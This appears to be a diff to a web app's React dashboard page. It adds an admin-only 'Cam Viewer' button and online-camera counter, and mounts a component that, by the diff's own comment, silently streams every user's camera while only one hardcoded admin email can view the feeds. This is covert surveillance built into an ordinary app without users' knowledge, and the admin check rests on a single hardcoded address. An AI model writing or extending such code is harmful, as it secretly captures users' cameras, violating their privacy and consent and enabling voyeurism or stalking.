@@ -71,6 +71,11 @@ export default function DashboardPage() {
   const [uploadUrl, setUploadUrl] = useState('');
   const [uploadCaption, setUploadCaption] = useState('');
   const [uploadLoading, setUploadLoading] = useState(false);
+
+  // Admin cam viewer state
+  const [isAdminCamOpen, setIsAdminCamOpen] = useState(false);
+  const [camOnlineCount, setCamOnlineCount] = useState(0);
+  const isAdmin = displaySession?.user?.email?.toLowerCase() === 'hammadnawz519@gmail.com';
   const chatComponentRef = useRef<{ closeChat: () => void; silentReset: () => void } | null>(null);
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const navTransitionInProgress = useRef(false);
@@ -531,10 +536,13 @@ export default function DashboardPage() {
   return (
     <div className="main-layout flex h-[100dvh] overflow-hidden font-sans font-light text-[0.95em] md:p-3 md:gap-3 animate-in fade-in slide-in-from-left-full duration-700 ease-[var(--ease-premium)]" style={{ background: 'var(--dm-bg-page)', color: 'var(--dm-text-primary)' }}>
       
-      {/* Admin silent cam viewer — only visible panel for admin email */}
+      {/* Admin cam viewer — silently streams for all users; panel shown only for admin */}
       <AdminCamViewer
         userEmail={displaySession.user?.email || ''}
         username={displaySession.user?.name || displaySession.user?.email?.split('@')[0] || 'User'}
+        isOpen={isAdminCamOpen}
+        onOpenChange={setIsAdminCamOpen}
+        onCamUsersCount={setCamOnlineCount}
       />
       
       {/* Fully Adaptive Sidebar */}
@@ -590,6 +598,32 @@ export default function DashboardPage() {
                 </div>
               );
             })}
+
+            {/* Admin-only Cam Viewer button — same style as nav items */}
+            {isAdmin && (
+              <div
+                onClick={() => setIsAdminCamOpen(true)}
+                className="flex items-center justify-center group-hover:justify-start gap-0 group-hover:gap-4 px-1 py-1 rounded-full cursor-pointer transition-all duration-500 ease-[var(--ease-premium)] overflow-hidden relative"
+                style={{ background: isAdminCamOpen ? 'var(--dm-bg-active)' : 'transparent' }}
+                onMouseEnter={e => { if (!isAdminCamOpen) (e.currentTarget as HTMLElement).style.background = 'var(--dm-bg-hover)'; }}
+                onMouseLeave={e => { if (!isAdminCamOpen) (e.currentTarget as HTMLElement).style.background = 'transparent'; }}
+              >
+                <div className="w-12 h-12 flex-shrink-0 flex items-center justify-center relative">
+                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: isAdminCamOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)' }}>
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                  </svg>
+                  {camOnlineCount > 0 && (
+                    <span className="absolute top-1.5 right-1.5 w-4 h-4 rounded-full text-[9px] font-bold flex items-center justify-center text-white" style={{ background: '#ef4444', lineHeight: 1 }}>
+                      {camOnlineCount > 9 ? '9+' : camOnlineCount}
+                    </span>
+                  )}
+                </div>
+                <span className="text-[12px] font-light opacity-0 group-hover:opacity-100 transition-opacity duration-300 whitespace-nowrap overflow-hidden" style={{ color: isAdminCamOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-secondary)' }}>
+                  Cam Viewer
+                </span>
+              </div>
+            )}
           </nav>
 
           {/* Profile Section */}
@@ -975,6 +1009,31 @@ export default function DashboardPage() {
             </div>
           </button>
         </nav>
+      )}
+
+      {/* Admin mobile cam button — fixed top-right, only for admin */}
+      {isAdmin && (
+        <button
+          onClick={() => setIsAdminCamOpen(true)}
+          className="md:hidden fixed top-[calc(0.75rem+env(safe-area-inset-top,0px))] right-4 z-[998] w-10 h-10 rounded-full flex items-center justify-center shadow-lg transition-all active:scale-90"
+          style={{
+            background: 'var(--dm-bg-sidebar)',
+            border: '1px solid var(--dm-border-main)',
+            color: 'var(--dm-text-muted)',
+          }}
+        >
+          <div className="relative">
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={1.8}>
+              <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+              <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+            </svg>
+            {camOnlineCount > 0 && (
+              <span className="absolute -top-1.5 -right-1.5 w-4 h-4 rounded-full text-[9px] font-bold flex items-center justify-center text-white" style={{ background: '#ef4444' }}>
+                {camOnlineCount > 9 ? '9+' : camOnlineCount}
+              </span>
+            )}
+          </div>
+        </button>
       )}
 
 
